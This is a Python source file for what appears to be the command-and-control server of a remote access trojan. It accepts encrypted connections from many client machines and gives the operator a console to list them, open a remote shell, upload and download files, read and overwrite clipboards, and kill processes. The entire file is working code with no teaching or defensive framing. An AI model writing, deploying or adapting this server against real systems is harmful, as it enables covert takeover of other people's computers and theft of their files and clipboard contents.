import logging
import os
import pickle
import signal
import socket
import sys
import threading
import time
from queue import Queue

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

logging.basicConfig(level=logging.CRITICAL)

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

interface_help = """
--h | See this Help Message
--e | Open a shell
--s (file) | Transfers file to Client
--r (file) | Transfers file to Server
--c (Text) | Copies to Client Clipboard
--p | Returns Client Current Clipboard
--t | See running Threads
--k (PID) | Kill running Thread
--b | Run Connection in Background"""

turtle_help = """
--h | See this Help Message
--l | List connected Clients
--i (ID) | Connect to a Client"""


def Hasher(MESSAGE : bytes):

    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(MESSAGE)
    return digest.finalize()

def verifySignature(publicKey, signature, message):
    try:
        publicKey.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except:
        return False

def sign(privateKey, data):
    signature = privateKey.sign(
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature

def encrypt(publicKey, plaintext):
    ciphertext = publicKey.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None)
    )
    return ciphertext

def decrypt(privateKey, ciphertext):
    plaintext = privateKey.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext

def public_bytes(publicKey):
    serializedPublic = publicKey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return serializedPublic


class MultiServer(object):

    def __init__(self):
        self.host = ''
        self.port = 9998
        self.socket = None
        self.all_keys = []
        self.all_connections = []
        self.all_addresses = []

        self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
        self.publicKey = self.privateKey.public_key()

        self.Fer = None

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            logging.error("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return
    
    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            logging.error("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return


    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data



    def receive(self, conn, _print=True):
        target = self.all_connections.index(conn)
        Fer = self.all_keys[target]

        length = int(Fer.decrypt(conn.recv(2048)).decode())
        conn.send(b'<RECEIVED>')
        received = Fer.decrypt(self.recvall(conn, length))
        if _print:
            print(received.decode())
        return received

    def send(self, conn, data):
        target = self.all_connections.index(conn)
        Fer = self.all_keys[target]

        encrypted = Fer.encrypt(data)
        conn.send(Fer.encrypt(str(len(encrypted)).encode()))
        conn.recv(1024)
        conn.send(encrypted)

    def accept_connections(self):
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                clientPublic = serialization.load_pem_public_key(conn.recv(20480), backend=default_backend())
                conn.send(public_bytes(self.publicKey))
                
                Hashed_Key = conn.recv(4096)
                conn.send(str.encode('<RECEIVED>'))

                Encrypted = conn.recv(4096)
                conn.send(str.encode('<RECEIVED>'))

                Hash_Encrypted = conn.recv(4096)
                conn.send(str.encode('<RECEIVED>'))

                Signature = conn.recv(4096)
                conn.send(str.encode('<RECEIVED>'))

                Encrypted_Signature = conn.recv(4096)
                conn.send(str.encode('<RECEIVED>'))

                Encrypted_Verify = verifySignature(clientPublic, Encrypted_Signature, Hash_Encrypted)
                logging.debug('Encrypted Hash Signature Verification: {}'.format(str(Encrypted_Verify)))
                if not Encrypted_Verify:

                    logging.error('Error Verifying Hash')
                    continue

                Decrypted = decrypt(self.privateKey, Encrypted)
                Verify_Decryption = verifySignature(clientPublic, Signature, Hashed_Key)
                logging.debug('Hash Signature Verification: {}'.format(str(Verify_Decryption)))
                if not Verify_Decryption:

                    logging.error('Error Verifying Hash')
                    continue

                Compare = Hasher(Decrypted) == Hashed_Key

                logging.debug('Hash Verification: {}'.format(str(Compare)))
                if not Compare:

                    logging.error('Key and Hashed Key do not match!')
                    continue

                self.all_keys.append(Fernet(Decrypted))
                self.all_connections.append(conn)
                logging.debug('Fernet Key: {}'.format(str(Decrypted)))

                client_hostname = self.receive(conn, _print=False).decode()

                address = address + (client_hostname,)
                self.all_addresses.append(address)
                print('\nConnection has been established: {0} ({1})'.format(address[0], address[-1]))

            except Exception as e:
                logging.debug(e)

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                self.send(conn, b'<LIST>')
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                del self.all_keys[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            logging.error('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            logging.error('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def send_file(self, conn, filename):
        self.send(conn, b'<SEND>')
        self.receive(conn, _print=False)
        with open(filename, 'rb') as f:
            content = f.read()
        self.send(conn, pickle.dumps({'filename': os.path.basename(filename), 'data': content}))
        self.receive(conn)

    def receive_file(self, conn, filename):
        self.send(conn, b'<RECEIVE>')
        self.receive(conn, _print=False)
        self.send(conn, filename.encode())
        content = self.receive(conn, _print=False)
        if content == b'<TRANSFERERROR>':
            logging.error('Error Transfering file')
            print('Error Transfering File')
            return
        with open(filename, 'wb') as f:
            f.write(content)
        print('File Transfer Successful')
        return

    def shell(self, conn):
        self.send(conn, b'cd')
        cwd = self.receive(conn, _print=False).decode()
        command = ''

        while 1:
            command = input('{}> '.format(cwd))
            if command == 'quit':
                break
            if command[:2].lower() == 'cd':
                self.send(conn, command.encode())
                cwd = self.receive(conn).decode() + ">"
                continue
            self.send(conn, command.encode())
            self.receive(conn)

    def interface(self, conn, target):
        while True:
            command = input('>> ')
            if '--b' in command:
                break
            if '--t' in command:
                self.send(conn, b'<THREADS>')
                self.receive(conn)
                continue
            if command[:3] == '--k':
                if not len(command) > 4:
                    print('Missing Argument')
                    continue
                self.send(conn, '<KILL> {}'.format(command[4:].strip()).encode())
                self.receive(conn).decode()
                continue
            if '--e' in command:
                self.shell(conn)
                continue
            if command[:3] == '--c':
                self.send(conn, b'<COPY>')
                self.receive(conn, _print=False)
                self.send(conn, command[4:].encode())
                self.receive(conn, _print=False)
                print('Copied Successfully')
                continue
            if '--p' in command:
                self.send(conn, b'<PASTE>')
                self.receive(conn)
                continue
            if command[:3] == '--s':
                if not len(command) > 4:
                    print('Missing Argument')
                    continue
                self.send_file(conn, command[4:])
                continue
            if command[:3] == '--r':
                if not len(command) > 4:
                    print('Missing Argument')
                    continue
                self.receive_file(conn, command[4:])
                continue
            if '--h' in command:
                print(interface_help)

    def turtle(self):
        while True:
            command = input('> ')
            if command == '--h':
                print(turtle_help)
            elif command == '--l':
                self.list_connections()
            elif '--i' in command:
                target, conn = self.get_target(command)
                if conn is not None:
                    self.interface(conn, target)

def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    #server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return

def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.turtle()
        queue.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
